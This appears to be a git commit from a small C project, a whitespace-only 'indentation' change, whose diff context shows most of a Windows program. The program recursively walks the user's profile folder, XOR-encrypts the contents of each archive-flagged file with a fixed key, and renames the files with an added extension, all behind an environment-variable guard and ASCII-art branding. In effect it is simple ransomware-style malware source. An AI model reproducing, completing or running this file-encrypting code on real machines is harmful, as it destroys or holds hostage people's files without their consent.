91d7f9631f7925e8a58cadabf70384b8c75a0cc6
Fytex <pedropauloqt@gmail.com>
2020-07-13 23:05:28 +0100

    Improved identation

--- main.c
+++ main.c
@@ -12,6 +12,7 @@
 int encrypt = -1; // 1 - encrypt, 0 - decrypt, -1 - undefined
 
 void print_ascii_art() {
+	
 	puts("\n\n"
 		"\t\t\tHHHHHHHHH     HHHHHHHHH       444444444   333333333333333\n"
 		"\t\t\tH:::::::H     H:::::::H      4::::::::4  3:::::::::::::::33\n"
@@ -33,10 +34,10 @@ void print_ascii_art() {
 
 
 void xor_encryption (char* file) {
+	
 	char* ext = strrchr(file, '.');
 	
 	if (encrypt == -1)
-		
 		encrypt = strcmp(ext, CRYPTO_EXT) & 1;
 	
 	else if (encrypt != (strcmp(ext, CRYPTO_EXT) & 1))
@@ -49,12 +50,14 @@ void xor_encryption (char* file) {
 	fp = fopen(file, "rb+");
 
 	if (fp) {
+		
 		fseek(fp, 0, SEEK_END);
 		length = ftell(fp);
 		fseek(fp, 0, SEEK_SET);
 		content = malloc(length + 1);
 		
 		if (content) {
+			
 			length = fread(content, 1, length, fp);
 			
 			if (length) {
@@ -66,8 +69,7 @@ void xor_encryption (char* file) {
 					*tmp = *tmp ^ CRYPTO_NUM;
 
 				fwrite(content, 1, length, fp);
-			}
-			
+			}	
 		}
 		
 		fclose(fp);
@@ -75,6 +77,7 @@ void xor_encryption (char* file) {
 	}
 
 	if (encrypt) {
+		
 		char* new_file = (char *) malloc(strlen(file) + CRYPTO_EXT_LEN + 1);
 		strcpy(new_file, file);
 		strcat(new_file, CRYPTO_EXT);
@@ -82,6 +85,7 @@ void xor_encryption (char* file) {
 		free(new_file);
 	}
 	else {
+		
 		char* old_file = strdup(file);
 		*ext = '\0';
 		rename(old_file, file);
@@ -89,30 +93,30 @@ void xor_encryption (char* file) {
 	}
 }
 
-void files_tree(const char *folder)
-{
+void files_tree(const char *folder) {
+	
     char wildcard[MAX_PATH];
     sprintf(wildcard, "%s\\*", folder);
     WIN32_FIND_DATA fd;
     HANDLE handle = FindFirstFile(wildcard, &fd);
+	
     if(handle == INVALID_HANDLE_VALUE) return;
 	
     do {
 		
         if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) 
-            continue;
+        	continue;
 		
-		char path[MAX_PATH];
+	char path[MAX_PATH];
         sprintf(path, "%s\\%s", folder, fd.cFileName);
 
         if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
-			files_tree(path);
+		files_tree(path);
 		
 		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
 			xor_encryption(path);
 			//puts(path);
-		
-		
+				
     } while(FindNextFile(handle, &fd));
 	
     FindClose(handle);
@@ -120,15 +124,15 @@ void files_tree(const char *folder)
 
 int main(void) {
 	
-	
-	char* env;
-	env = getenv(CRYPTO_ENV_NAME);
+	char* env = getenv(CRYPTO_ENV_NAME);
 	
 	if (strcmp(env, CRYPTO_ENV_VALUE)) {
+		
 		void* home_path = getenv("USERPROFILE");
 		void* path = home_path;
 		
 		if (RELATIVE_FOLDER) {
+			
 			path = malloc(strlen(home_path) + strlen(RELATIVE_FOLDER) + 1);
 			strcpy(path, home_path);
 			strcat(path, RELATIVE_FOLDER);
